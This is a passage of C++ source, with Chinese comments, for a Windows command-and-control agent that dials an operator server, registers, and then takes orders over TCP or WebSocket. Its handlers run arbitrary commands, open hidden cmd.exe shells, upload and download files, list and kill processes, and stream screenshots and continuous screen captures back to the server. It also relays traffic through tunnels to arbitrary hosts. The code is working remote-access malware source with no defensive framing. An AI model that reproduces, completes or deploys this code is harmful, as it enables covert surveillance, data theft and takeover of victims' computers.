    LPPROC_THREAD_ATTRIBUTE_LIST pList = (LPPROC_THREAD_ATTRIBUTE_LIST)attrBuf;
    if (!pInit(pList, 1, 0, &attrSize)) {
        HeapFree(GetProcessHeap(), 0, attrBuf);
        pClosePC(hPC);
        CloseHandle(inRead);
        CloseHandle(outWrite);
        CloseHandle(inWrite);
        CloseHandle(outRead);
        return false;
    }
    if (!pUpd(pList, 0, PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE, &hPC, sizeof(hPC), NULL, NULL)) {
        pDel(pList);
        HeapFree(GetProcessHeap(), 0, attrBuf);
        pClosePC(hPC);
        CloseHandle(inRead);
        CloseHandle(outWrite);
        CloseHandle(inWrite);
        CloseHandle(outRead);
        agent_dbg("[shell-create] UpdateProcThreadAttribute PSEUDOCONSOLE le=%lu", (unsigned long)GetLastError());
        return false;
    }

    STARTUPINFOEXA si = {0};
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
    si.StartupInfo.wShowWindow = SW_HIDE;
    si.lpAttributeList = pList;

    PROCESS_INFORMATION pi = {0};
    char cmdline[] = "cmd.exe /q /d /k";
    BOOL ok = CreateProcessA(NULL, cmdline, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_UNICODE_ENVIRONMENT, NULL, NULL,
                             &si.StartupInfo, &pi);

    pDel(pList);
    HeapFree(GetProcessHeap(), 0, attrBuf);

    if (!ok) {
        agent_dbg("[shell-create] CreateProcess ConPTY le=%lu", (unsigned long)GetLastError());
        pClosePC(hPC);
        CloseHandle(inRead);
        CloseHandle(outWrite);
        CloseHandle(inWrite);
        CloseHandle(outRead);
        return false;
    }

    CloseHandle(pi.hThread);
    // 此时子进程已挂接到伪终端，可释放 CreatePseudoConsole 时传入的两端（见 MS 文档）
    CloseHandle(inRead);
    CloseHandle(outWrite);

    ss->hProc = pi.hProcess;
    ss->hWrite = inWrite;
    ss->hRead = outRead;
    ss->hPC = hPC;
    ss->useConPty = true;
    ss->sid = sid;
    agent_dbg("[shell-create] ConPTY ok sid=%s", sid.c_str());
    return true;
}

// ConPTY 在部分系统上会触发 cmd 启动失败（0xc0000142 等）。默认关闭，仅用匿名管道+CREATE_NO_WINDOW（稳定、无窗）。
// 确需伪终端时再设环境变量 C2_USE_CONPTY=1（退格较好，但可能弹窗或启动失败）。
static bool shell_env_use_conpty() {
    char buf[16];
    DWORD n = GetEnvironmentVariableA("C2_USE_CONPTY", buf, sizeof(buf));
    if (n == 0 || n >= sizeof(buf)) return false;
    if (buf[0] == '1' || buf[0] == 'y' || buf[0] == 'Y' || buf[0] == 't' || buf[0] == 'T') return true;
    if (buf[0] == '0' || buf[0] == 'f' || buf[0] == 'F') return false;
    if (n >= 2 && buf[0] == 'n' && buf[1] == 'o') return false;
    return false;
}

static std::string shell_session_create(const std::string& sid) {
    std::lock_guard<std::mutex> lk(g_shell_mu);
    if (g_shells.count(sid)) return "Session already exists";

    ShellSession* ss = new ShellSession();
    if (shell_env_use_conpty() && shell_try_create_conpty(ss, sid)) {
        ss->run = true;
        g_shells[sid] = ss;
        ss->th = std::thread(shell_read_thread, ss);
        // ConPTY 下 cmd 常等到 stdin 有活动才把版权/提示符刷到输出管；纯管道路径刻意不写「唤醒」以免多一行 C:\>。
        // 此处仅 ConPTY：极短延迟后写一个 \r，促发首帧，避免 Web 端一直空白、ReadFile 长期无数据。
        Sleep(40);
        DWORD bwake = 0;
        if (ss->hWrite && ss->hWrite != INVALID_HANDLE_VALUE) {
            WriteFile(ss->hWrite, "\r", 1, &bwake, NULL);
            agent_dbg("[shell-create] ConPTY wake WriteFile bw=%lu sid=%s", (unsigned long)bwake, sid.c_str());
        }
        return "Session created successfully";
    }

    // 回退：匿名管道（退格等控制符无法像真实控制台行编辑，仅兼容旧系统）
    agent_dbg("[shell-create] ConPTY 不可用，回退 CreatePipe+CREATE_NO_WINDOW sid=%s", sid.c_str());
    HANDLE rOut, wOut, rIn, wIn;
    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
    if (!CreatePipe(&rOut, &wOut, &sa, 0) || !CreatePipe(&rIn, &wIn, &sa, 0)) {
        delete ss;
        return "pipe failed";
    }
    SetHandleInformation(rOut, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(wIn, HANDLE_FLAG_INHERIT, 0);
    STARTUPINFOA si = {sizeof(si)};
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = wOut;
    si.hStdError = wOut;
    si.hStdInput = rIn;
    PROCESS_INFORMATION pi = {0};
    char* cmd = _strdup("cmd.exe /q /d /k");
    BOOL ok = CreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    free(cmd);
    CloseHandle(wOut);
    CloseHandle(rIn);
    if (!ok) {
        CloseHandle(rOut);
        CloseHandle(wIn);
        delete ss;
        return "Failed to create process";
    }
    CloseHandle(pi.hThread);
    ss->hProc = pi.hProcess;
    ss->hRead = rOut;
    ss->hWrite = wIn;
    ss->hPC = NULL;
    ss->useConPty = false;
    ss->sid = sid;
    ss->run = true;
    g_shells[sid] = ss;
    ss->th = std::thread(shell_read_thread, ss);
    agent_dbg("[shell-create] pipe ok sid=%s (no stdin wake)", sid.c_str());
    return "Session created successfully";
}

static std::string shell_session_write(const std::string& sid, const std::string& input_b64, const std::string& input_legacy) {
    std::lock_guard<std::mutex> lk(g_shell_mu);
    auto it = g_shells.find(sid);
    if (it == g_shells.end()) {
        agent_dbg("[shell-write] FAIL unknown sid=%s (no such session)", sid.c_str());
        return "Unknown session";
    }
    std::string input;
    if (!input_b64.empty()) {
        std::vector<BYTE> raw = b64_dec(input_b64);
        input.assign((const char*)raw.data(), raw.size());
    } else {
        input = input_legacy;
    }
    agent_dbg("[shell-write] sid=%s in_len=%zu b64=%d ws=%d", sid.c_str(), input.size(), input_b64.empty() ? 0 : 1,
              g_use_ws.load() ? 1 : 0);
    agent_dbg_bytes("[shell-write] stdin", input, 160);
    std::string wire =
        it->second->useConPty ? utf8_to_conpty_input_bytes(input) : utf8_to_console_input_bytes(input);
    DWORD bw = 0;
    if (!WriteFile(it->second->hWrite, wire.data(), (DWORD)wire.size(), &bw, NULL)) {
        agent_dbg("[shell-write] WriteFile FAIL sid=%s le=%lu", sid.c_str(), (unsigned long)GetLastError());
        return "Write failed";
    }
    agent_dbg("[shell-write] OK sid=%s bw=%lu/%zu (wire)", sid.c_str(), (unsigned long)bw, wire.size());
    return "";
}

static std::string shell_session_close(const std::string& sid) {
    ShellSession* s = nullptr;
    {
        std::lock_guard<std::mutex> lk(g_shell_mu);
        auto it = g_shells.find(sid);
        if (it == g_shells.end()) return "Unknown session";
        s = it->second;
        g_shells.erase(it);
    }
    // 必须在解锁后再 join：join 可能较久，持锁会阻塞新的 shell_session_create / write，重连时表现为第二次无输出。
    s->run = false;
    if (s->hPC) {
        typedef void(WINAPI * PFN_ClosePseudoConsole)(void*);
        PFN_ClosePseudoConsole pClose =
            (PFN_ClosePseudoConsole)GetProcAddress(GetModuleHandleA("kernel32.dll"), "ClosePseudoConsole");
        if (pClose) pClose(s->hPC);
        s->hPC = NULL;
    }
    if (s->hWrite) CloseHandle(s->hWrite), s->hWrite = NULL;
    if (s->hRead) CloseHandle(s->hRead), s->hRead = NULL;
    if (s->hProc) {
        if (!s->useConPty) TerminateProcess(s->hProc, 0);
        CloseHandle(s->hProc);
        s->hProc = NULL;
    }
    if (s->th.joinable()) s->th.join();
    delete s;
    return "Session closed successfully";
}

// ---------- WebSocket ----------
static bool recv_exact(SOCKET sk, void* buf, size_t n) {
    char* p = (char*)buf;
    size_t g = 0;
    while (g < n) {
        int r = recv(sk, p + (int)g, (int)(n - g), 0);
        if (r <= 0) return false;
        g += (size_t)r;
    }
    return true;
}

static bool ws_send_frame_text_unlocked(SOCKET s, const std::string& text) {
    std::vector<BYTE> out;
    out.push_back(0x81);
    size_t len = text.size();
    if (len <= 125) {
        out.push_back((BYTE)(128 | len));
    } else if (len <= 65535) {
        out.push_back((BYTE)(128 | 126));
        out.push_back((BYTE)((len >> 8) & 0xFF));
        out.push_back((BYTE)(len & 0xFF));
    } else {
        out.push_back((BYTE)(128 | 127));
        unsigned long long l = len;
        for (int i = 7; i >= 0; --i) out.push_back((BYTE)((l >> (i * 8)) & 0xFF));
    }
    BYTE mk[4];
    for (int i = 0; i < 4; i++) mk[i] = (BYTE)(rand() & 0xFF);
    for (int i = 0; i < 4; i++) out.push_back(mk[i]);
    for (size_t i = 0; i < len; i++) out.push_back((BYTE)(text[i] ^ mk[i % 4]));
    size_t sent = 0;
    while (sent < out.size()) {
        int w = send(s, (const char*)out.data() + sent, (int)(out.size() - sent), 0);
        if (w <= 0) return false;
        sent += (size_t)w;
    }
    return true;
}

static void channel_send(const std::string& json) {
    std::lock_guard<std::mutex> lk(g_mu);
    if (g_use_ws && g_ws != INVALID_SOCKET)
        ws_send_frame_text_unlocked(g_ws, json);
    else if (g_socket != INVALID_SOCKET)
        send_line_sec(g_socket, json);
}

static void channel_command_response(const std::string& json, bool reply_tcp) {
    std::lock_guard<std::mutex> lk(g_mu);
    if (reply_tcp) {
        send_line_sec(g_socket, json);
        return;
    }
    if (g_use_ws && g_ws != INVALID_SOCKET)
        ws_send_frame_text_unlocked(g_ws, json);
    else if (g_socket != INVALID_SOCKET)
        send_line_sec(g_socket, json);
}

static void send_cmd_resp(const std::string& id, const std::string& res, bool ok, bool reply_tcp) {
    std::map<std::string, std::string> m;
    m["type"] = "command_response";
    m["command_id"] = id;
    m["result"] = res;
    m["success"] = ok ? "true" : "false";
    channel_command_response(json_obj(m), reply_tcp);
}

static void tunnel_send_line(const std::string& json) {
    std::lock_guard<std::mutex> lk(g_tcp_mu);
    if (g_socket != INVALID_SOCKET) send_line_tcp_unlocked(g_socket, json);
}

static void tunnel_fwd(unsigned int tid, const std::string& cid, SOCKET sk) {
    unsigned char buf[8192];
    while (g_running && g_socket != INVALID_SOCKET) {
        int n = recv(sk, (char*)buf, sizeof(buf), 0);
        if (n <= 0) break;
        std::map<std::string, std::string> m;
        m["type"] = "tunnel_data";
        m["tunnel_id"] = std::to_string(tid);
        m["conn_id"] = cid;
        m["direction"] = "in";
        m["data"] = b64_enc(buf, (size_t)n);
        tunnel_send_line(json_obj(m));
    }
    g_tunnel_mu.lock();
    g_tunnels.erase(cid);
    g_tunnel_mu.unlock();
    closesocket(sk);
}

// ---------- GDI+ 截屏 / 屏幕监控（与 hub.go / connection.go 的 type=screenshot + id 入库一致）----------
static ULONG_PTR g_gdiplus_token = 0;
static std::once_flag g_gdiplus_once;
static std::mutex g_monitor_mu;
static std::thread g_monitor_th;
static std::atomic<bool> g_monitor_run{false};

static void ensure_gdiplus() {
    std::call_once(g_gdiplus_once, []() {
        Gdiplus::GdiplusStartupInput in;
        Gdiplus::GdiplusStartup(&g_gdiplus_token, &in, nullptr);
    });
}

static bool gdi_get_encoder_clsid(const WCHAR* mime, CLSID* clsid) {
    UINT n = 0, sz = 0;
    Gdiplus::GetImageEncodersSize(&n, &sz);
    if (sz == 0) return false;
    std::vector<BYTE> buf(sz);
    auto* pici = reinterpret_cast<Gdiplus::ImageCodecInfo*>(buf.data());
    if (Gdiplus::GetImageEncoders(n, sz, pici) != Gdiplus::Ok) return false;
    for (UINT j = 0; j < n; ++j) {
        if (wcscmp(pici[j].MimeType, mime) == 0) {
            *clsid = pici[j].Clsid;
            return true;
        }
    }
    return false;
}

static std::string screenshot_fmt_lower(std::string s) {
    for (char& c : s) {
        if (c >= 'A' && c <= 'Z') c = (char)(c - 'A' + 'a');
    }
    return s;
}

// want_fmt: png / jpeg / jpg；jpeg_quality 仅对 JPEG 生效。
static bool capture_screen_b64(const std::string& want_fmt_in, int jpeg_quality, std::string& out_b64, std::string& out_format,
                               int& out_w, int& out_h) {
    ensure_gdiplus();
    std::string want = screenshot_fmt_lower(want_fmt_in);
    if (want.empty()) want = "png";
    bool as_jpeg = (want == "jpeg" || want == "jpg");
    if (!as_jpeg && want != "png") want = "png";

    int vx = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int vy = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int vw = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int vh = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    if (vw <= 0 || vh <= 0) {
        vx = 0;
        vy = 0;
        vw = GetSystemMetrics(SM_CXSCREEN);
        vh = GetSystemMetrics(SM_CYSCREEN);
    }

    HDC scr = GetDC(nullptr);
    if (!scr) return false;
    HDC mem = CreateCompatibleDC(scr);
    HBITMAP hb = CreateCompatibleBitmap(scr, vw, vh);
    if (!mem || !hb) {
        if (hb) DeleteObject(hb);
        if (mem) DeleteDC(mem);
        ReleaseDC(nullptr, scr);
        return false;
    }
    HGDIOBJ old = SelectObject(mem, hb);
    if (!BitBlt(mem, 0, 0, vw, vh, scr, vx, vy, SRCCOPY)) {
        SelectObject(mem, old);
        DeleteObject(hb);
        DeleteDC(mem);
        ReleaseDC(nullptr, scr);
        return false;
    }
    SelectObject(mem, old);
    ReleaseDC(nullptr, scr);

    Gdiplus::Bitmap bmp(hb, nullptr);
    if (bmp.GetLastStatus() != Gdiplus::Ok) {
        DeleteObject(hb);
        DeleteDC(mem);
        return false;
    }

    CLSID enc{};
    const WCHAR* mime = as_jpeg ? L"image/jpeg" : L"image/png";
    if (!gdi_get_encoder_clsid(mime, &enc)) {
        DeleteObject(hb);
        DeleteDC(mem);
        return false;
    }

    IStream* stream = nullptr;
    if (CreateStreamOnHGlobal(nullptr, TRUE, &stream) != S_OK || !stream) {
        DeleteObject(hb);
        DeleteDC(mem);
        return false;
    }

    Gdiplus::Status st;
    if (as_jpeg) {
        if (jpeg_quality < 1) jpeg_quality = 1;
        if (jpeg_quality > 100) jpeg_quality = 100;
        ULONG q = (ULONG)jpeg_quality;
        Gdiplus::EncoderParameters ep;
        ep.Count = 1;
        ep.Parameter[0].Guid = Gdiplus::EncoderQuality;
        ep.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
        ep.Parameter[0].NumberOfValues = 1;
        ep.Parameter[0].Value = &q;
        st = bmp.Save(stream, &enc, &ep);
    } else {
        st = bmp.Save(stream, &enc, nullptr);
    }
    if (st != Gdiplus::Ok) {
        stream->Release();
        DeleteObject(hb);
        DeleteDC(mem);
        return false;
    }

    HGLOBAL hg = nullptr;
    if (GetHGlobalFromStream(stream, &hg) != S_OK || !hg) {
        stream->Release();
        DeleteObject(hb);
        DeleteDC(mem);
        return false;
    }
    SIZE_T gs = GlobalSize(hg);
    void* ptr = GlobalLock(hg);
    if (!ptr) {
        stream->Release();
        DeleteObject(hb);
        DeleteDC(mem);
        return false;
    }
    out_b64 = b64_enc(static_cast<const unsigned char*>(ptr), (size_t)gs);
    GlobalUnlock(hg);
    stream->Release();
    DeleteObject(hb);
    DeleteDC(mem);

    out_w = vw;
    out_h = vh;
    out_format = as_jpeg ? "jpeg" : "png";
    return true;
}

static void screen_monitor_end() {
    std::lock_guard<std::mutex> lk(g_monitor_mu);
    g_monitor_run = false;
    if (g_monitor_th.joinable()) g_monitor_th.join();
}

static void screen_monitor_loop(std::string first_cmd_id, int interval_ms, int quality, std::string fmt, bool reply_tcp) {
    bool first = true;
    while (g_monitor_run.load()) {
        std::string b64, sf;
        int w = 0, h = 0;
        if (!capture_screen_b64(fmt, quality, b64, sf, w, h)) {
            if (first) send_cmd_resp(first_cmd_id, "capture failed", false, reply_tcp);
            break;
        }
        std::map<std::string, std::string> sm;
        sm["type"] = "screenshot";
        sm["id"] = first ? first_cmd_id : "";
        sm["width"] = std::to_string(w);
        sm["height"] = std::to_string(h);
        sm["format"] = sf;
        sm["data"] = b64;
        channel_send(json_obj(sm));
        first = false;
        int slept = 0;
        while (slept < interval_ms && g_monitor_run.load()) {
            int step = interval_ms - slept;
            if (step > 100) step = 100;
            Sleep((DWORD)step);
            slept += step;
        }
    }
}

static void screen_monitor_begin(const std::string& cmd_id, int interval_ms, int quality, const std::string& fmt, bool reply_tcp) {
    std::lock_guard<std::mutex> lk(g_monitor_mu);
    g_monitor_run = false;
    if (g_monitor_th.joinable()) g_monitor_th.join();
    g_monitor_run = true;
    g_monitor_th = std::thread(screen_monitor_loop, cmd_id, interval_ms, quality, fmt, reply_tcp);
}

static void handle_cmd(const std::string& id, const std::string& tp, std::map<std::string, std::string>& pl, bool reply_tcp) {
    std::string result;
    bool ok = true;

    if (tp == "tunnel_connect") {
        std::string host = pl["target_host"];
        int port = atoi(pl["target_port"].c_str());
        std::string cid = pl["conn_id"];
        unsigned tid = (unsigned)strtoul(pl["tunnel_id"].c_str(), NULL, 10);
        if (!host.empty() && port > 0 && !cid.empty()) {
            SOCKET sk = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (sk != INVALID_SOCKET) {
                sockaddr_in a = {0};
                a.sin_family = AF_INET;
                a.sin_port = htons((u_short)port);
                if (inet_pton(AF_INET, host.c_str(), &a.sin_addr) == 1 && connect(sk, (sockaddr*)&a, sizeof(a)) == 0) {
                    g_tunnel_mu.lock();
                    g_tunnels[cid] = sk;
                    g_tunnel_mu.unlock();
                    std::thread(tunnel_fwd, tid, cid, sk).detach();
                } else {
                    closesocket(sk);
                }
            }
        }
        return;
    }
    if (tp == "tunnel_data") {
        std::string cid = pl["conn_id"];
        std::string data = pl["data"];
        if (!cid.empty() && !data.empty()) {
            std::vector<BYTE> raw = b64_dec(data);
            g_tunnel_mu.lock();
            auto it = g_tunnels.find(cid);
            SOCKET sk = (it != g_tunnels.end()) ? it->second : INVALID_SOCKET;
            g_tunnel_mu.unlock();
            if (sk != INVALID_SOCKET && !raw.empty()) send(sk, (const char*)raw.data(), (int)raw.size(), 0);
        }
        return;
    }

    if (tp == "exec" || tp == "shell") {
        result = sh_exec(pl["command"]);
    } else if (tp == "shell_session_create") {
        agent_dbg("[handle_cmd] shell_session_create cmd_id=%s session_id=%s reply_tcp=%d", id.c_str(),
                  pl["session_id"].c_str(), reply_tcp ? 1 : 0);
        result = shell_session_create(pl["session_id"]);
        ok = (result.find("Session created successfully") == 0);
        agent_dbg("[handle_cmd] shell_session_create -> %s ok=%d", result.c_str(), ok ? 1 : 0);
    } else if (tp == "shell_session_write") {
        agent_dbg("[handle_cmd] shell_session_write cmd_id=%s session_id=%s reply_tcp=%d", id.c_str(),
                  pl["session_id"].c_str(), reply_tcp ? 1 : 0);
        result = shell_session_write(pl["session_id"], pl["input_b64"], pl["input"]);
        ok = result.empty();
        agent_dbg("[handle_cmd] shell_session_write result=%s ok=%d", result.empty() ? "(empty ok)" : result.c_str(),
                  ok ? 1 : 0);
    } else if (tp == "shell_session_close") {
        agent_dbg("[handle_cmd] shell_session_close cmd_id=%s session_id=%s", id.c_str(), pl["session_id"].c_str());
        result = shell_session_close(pl["session_id"]);
    } else if (tp == "list_dir") {
        result = list_dir_json(pl["path"]);
    } else if (tp == "list_dir_children") {
        result = list_dir_children_json(pl["path"]);
    } else if (tp == "mkdir") {
        std::string ap = utf8_to_ansi(pl["path"]);
        ok = CreateDirectoryA(ap.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
        result = ok ? "mkdir ok" : "mkdir failed";
    } else if (tp == "download") {
        std::string path = pl["path"];
        if (path.empty()) {
            ok = false;
            result = "missing path";
        } else if (!pl["offset"].empty()) {
            uint64_t off = strtoull(pl["offset"].c_str(), NULL, 10);
            size_t len = kFileChunkSize;
            if (!pl["length"].empty()) {
                unsigned long long L = strtoull(pl["length"].c_str(), NULL, 10);
                if (L > 0ULL && L <= 16ULL * 1024ULL * 1024ULL) len = (size_t)L;
            }
            ok = read_file_range_b64(path, off, len, result);
            if (!ok) result = "open failed";
        } else {
            std::string ap = utf8_to_ansi(path);
            HANDLE hf = CreateFileA(ap.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
            if (hf == INVALID_HANDLE_VALUE) {
                ok = false;
                result = "open failed";
            } else {
                CloseHandle(hf);
                result = read_file_b64(path);
                ok = true;
            }
        }
    } else if (tp == "upload") {
        // Empty content is valid (0-byte file); web UI uses this for「新建文件」.
        if (pl["path"].empty()) {
            ok = false;
            result = "missing path";
        } else if (!pl["chunk_index"].empty()) {
            uint64_t idx = strtoull(pl["chunk_index"].c_str(), NULL, 10);
            ok = write_file_chunk(pl["path"], pl["content"], idx);
            result = ok ? "chunk ok" : "chunk fail";
        } else {
            ok = write_file_full(pl["path"], pl["content"]);
            result = ok ? "write ok" : "write fail";
        }
    } else if (tp == "process_list") {
        result = process_list_json();
    } else if (tp == "kill_process") {
        int pid = atoi(pl["pid"].c_str());
        HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, (DWORD)pid);
        ok = h && TerminateProcess(h, 1);
        if (h) CloseHandle(h);
        result = ok ? "ok" : "kill failed";
    } else if (tp == "screenshot") {
        std::string fmt = pl["format"];
        int quality = 80;
        if (!pl["quality"].empty()) quality = atoi(pl["quality"].c_str());
        std::string b64, sf;
        int w = 0, h = 0;
        if (!capture_screen_b64(fmt, quality, b64, sf, w, h)) {
            ok = false;
            result = "capture failed";
        } else {
            std::map<std::string, std::string> sm;
            sm["type"] = "screenshot";
            sm["id"] = id;
            sm["width"] = std::to_string(w);
            sm["height"] = std::to_string(h);
            sm["format"] = sf;
            sm["data"] = b64;
            channel_send(json_obj(sm));
            return;
        }
    } else if (tp == "screen_monitor_start") {
        int interval = 1000;
        if (!pl["interval"].empty()) interval = atoi(pl["interval"].c_str());
        if (interval < 200) interval = 200;
        int quality = 80;
        if (!pl["quality"].empty()) quality = atoi(pl["quality"].c_str());
        std::string fmt = pl["format"];
        if (fmt.empty()) fmt = "jpeg";
        screen_monitor_begin(id, interval, quality, fmt, reply_tcp);
        return;
    } else if (tp == "screen_monitor_stop") {
        screen_monitor_end();
        result = "ok";
    } else if (tp == "autostart_set" || tp == "autostart_remove") {
        ok = false;
        result = "autostart not implemented in restored client";
    } else if (tp == "disconnect") {
        ExitProcess(0);
    } else {
        ok = false;
        result = "unknown: " + tp;
    }
    send_cmd_resp(id, result, ok, reply_tcp);
}

static std::string resolve_ws_host(const std::string& wh) {
    std::string h = wh.empty() ? embed_web_host_raw() : wh;
    if (h == "127.0.0.1" || h == "localhost" || h == "::1") {
        std::string fb = embed_web_host_raw();
        std::string fb_host;
        int fb_port = 0;
        if (split_host_port_str(fb, fb_host, fb_port)) {
            if (fb_host != "127.0.0.1" && fb_host != "localhost" && fb_host != "::1") return fb_host;
        } else if (!fb.empty() && fb != "127.0.0.1" && fb != "localhost" && fb != "::1") {
            return fb;
        }
        std::string th = embed_tcp_host_raw();
        std::string thh;
        int tp = 0;
        if (split_host_port_str(th, thh, tp)) return thh;
        return th;
    }
    return h;
}

static bool ws_http_upgrade(SOCKET sk, const std::string& host, int port, const std::string& path) {
    unsigned char rnd[16];
    for (int i = 0; i < 16; i++) rnd[i] = (unsigned char)(rand() & 0xFF);
    std::string key = b64_enc(rnd, 16);
    char req[2048];
    snprintf(req, sizeof(req),
             "GET %s HTTP/1.1\r\nHost: %s:%d\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\n\r\n",
             path.c_str(), host.c_str(), port, key.c_str());
    send(sk, req, (int)strlen(req), 0);
    char buf[4096];
    size_t t = 0;
    while (t < sizeof(buf) - 1) {
        if (recv(sk, buf + t, 1, 0) <= 0) return false;
        t++;
        if (t >= 4 && buf[t - 4] == '\r' && buf[t - 3] == '\n' && buf[t - 2] == '\r' && buf[t - 1] == '\n') break;
    }
    buf[t] = 0;
    return strstr(buf, "101") != NULL;
}

static void ws_loop() {
    SOCKET sk = g_ws;
    while (g_running && g_use_ws && sk != INVALID_SOCKET) {
        unsigned char h[2];
        if (!recv_exact(sk, h, 2)) break;
        unsigned op = h[0] & 0x0f;
        if (op == 8) break;
        uint64_t plen = h[1] & 0x7f;
        bool mask = (h[1] & 0x80) != 0;
        if (plen == 126) {
            unsigned char e[2];
            if (!recv_exact(sk, e, 2)) break;
            plen = (e[0] << 8) | e[1];
        } else if (plen == 127) {
            unsigned char e[8];
            if (!recv_exact(sk, e, 8)) break;
            plen = 0;
            for (int i = 0; i < 8; i++) plen = (plen << 8) | e[i];
        }
        unsigned char mk[4] = {0};
        if (mask && !recv_exact(sk, mk, 4)) break;
        if (plen > 50 * 1024 * 1024) break;
        std::string payload;
        payload.resize((size_t)plen);
        if (plen > 0 && !recv_exact(sk, &payload[0], (size_t)plen)) break;
        if (mask) {
            for (size_t i = 0; i < (size_t)plen; i++) payload[i] ^= mk[i % 4];
        }
        std::map<std::string, std::string> msg;
        if (parse_flat_json(payload, msg)) {
            std::string t = msg["type"];
            std::string id = msg["id"];
            if (t.find("shell_session") != std::string::npos)
                agent_dbg("[ws-rx] type=%s cmd_id=%s payload_len=%zu", t.c_str(), id.c_str(), payload.size());
            if (t == "list_dir" || t == "list_dir_children")
                handle_cmd(id, t, msg, false);
            else
                std::thread([id, t, msg]() mutable { handle_cmd(id, t, msg, false); }).detach();
        }
    }
    {
        std::lock_guard<std::mutex> lk(g_mu);
        if (g_ws == sk) {
            g_use_ws = false;
            g_ws = INVALID_SOCKET;
        }
    }
    if (sk != INVALID_SOCKET) closesocket(sk);
}

static void agent_ws_thread(std::string wh, std::string wp, std::string tok) {
    std::string host;
    int port = 0;
    resolve_ws_connect_params(wh, wp, host, port);
    if (port <= 0) port = (int)embed_web_port_le_raw();
    if (port <= 0) port = 8080;
    SOCKET sk = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sk == INVALID_SOCKET) return;
    sockaddr_in a = {0};
    a.sin_family = AF_INET;
    a.sin_port = htons((u_short)port);
    if (inet_pton(AF_INET, host.c_str(), &a.sin_addr) != 1) {
        closesocket(sk);
        return;
    }
    if (connect(sk, (sockaddr*)&a, sizeof(a)) != 0) {
        closesocket(sk);
        return;
    }
    std::string path = std::string("/ws/agent?token=") + tok;
    if (!ws_http_upgrade(sk, host, port, path)) {
        closesocket(sk);
        return;
    }
    {
        std::lock_guard<std::mutex> lk(g_mu);
        g_ws = sk;
        g_use_ws = true;
    }
    ws_loop();
}

static void tcp_control_loop() {
    while (g_running) {
        std::string line = recv_line_secure(g_socket, 60000);
        if (line.empty()) {
            if (g_use_ws) continue;
            continue;
        }
        std::map<std::string, std::string> msg;
        if (!parse_flat_json(line, msg)) continue;
        if (msg["type"].find("shell_session") != std::string::npos)
            agent_dbg("[tcp-rx] type=%s cmd_id=%s line_len=%zu", msg["type"].c_str(), msg["id"].c_str(), line.size());
        if (msg["type"] == "signal" && msg["action"] == "open_ws") {
            {
                std::lock_guard<std::mutex> lk(g_mu);
                g_use_ws = false;
                if (g_ws != INVALID_SOCKET) {
                    closesocket(g_ws);
                    g_ws = INVALID_SOCKET;
                }
            }
            std::thread(agent_ws_thread, msg["web_host"], msg["web_port"], msg["token"]).detach();
            continue;
        }
        // 面板对 list_dir / shell_session_* 等走 WebSocket，对 screenshot / screen_monitor / exec 等仍走 TCP。
        // 若此处因 g_use_ws 丢弃 TCP 行，截屏与监控命令永远不会执行，截屏回包也不会经 WS 入库。
        std::thread([msg]() mutable { handle_cmd(msg["id"], msg["type"], msg, true); }).detach();
    }
}

static void heartbeat_loop() {
    while (g_hb_run.load() && g_running) {
        Sleep(HEARTBEAT_INTERVAL * 1000);
        if (!g_hb_run.load()) break;
        g_hb_val++;
        std::map<std::string, std::string> m;
        m["type"] = "heartbeat";
        m["value"] = std::to_string(g_hb_val);
        char cwd[MAX_PATH] = {0};
        if (GetCurrentDirectoryA(sizeof(cwd), cwd)) m["working_dir"] = cwd;
        if (g_socket != INVALID_SOCKET) send_line_sec(g_socket, json_obj(m));
    }
}

int main() {
    srand((unsigned)GetTickCount());
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
    agent_dbg("start pid=%lu", (unsigned long)GetCurrentProcessId());
    agent_dbg_dump_c2_embed();

    while (g_running) {
        g_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (g_socket == INVALID_SOCKET) {
            Sleep(5000);
            continue;
        }
        sockaddr_in a = {0};
        a.sin_family = AF_INET;
        std::string dial_host;
        int dial_port = 0;
        resolve_tcp_dial(dial_host, dial_port);
        a.sin_port = htons((u_short)dial_port);
        if (inet_pton(AF_INET, dial_host.c_str(), &a.sin_addr) != 1) {
            agent_dbg("inet_pton failed dial_host=[%s]", dial_host.empty() ? "(empty)" : dial_host.c_str());
            closesocket(g_socket);
            g_socket = INVALID_SOCKET;
            Sleep(10000);
            continue;
        }
        agent_dbg("dial tcp %s:%d enc=%d ...", dial_host.c_str(), dial_port, use_enc() ? 1 : 0);
        if (connect(g_socket, (sockaddr*)&a, sizeof(a)) != 0) {
            agent_dbg("tcp connect failed WSA=%lu", (unsigned long)WSAGetLastError());
            agent_dbg("retry in 30s");
            closesocket(g_socket);
            g_socket = INVALID_SOCKET;
            Sleep(30000);
            continue;
        }
        agent_dbg("tcp connected, sending register...");
        std::map<std::string, std::string> reg;
        collect_register(reg);
        if (!send_line_secure(g_socket, json_obj(reg))) {
            closesocket(g_socket);
            g_socket = INVALID_SOCKET;
            Sleep(30000);
            continue;
        }
        std::string resp = recv_line_secure(g_socket, 10000);
        if (resp.find("registered") == std::string::npos) {
            agent_dbg("register failed: %s", resp.empty() ? "(empty)" : resp.substr(0, 120).c_str());
            closesocket(g_socket);
            g_socket = INVALID_SOCKET;
            Sleep(30000);
            continue;
        }
        agent_dbg("registered OK");
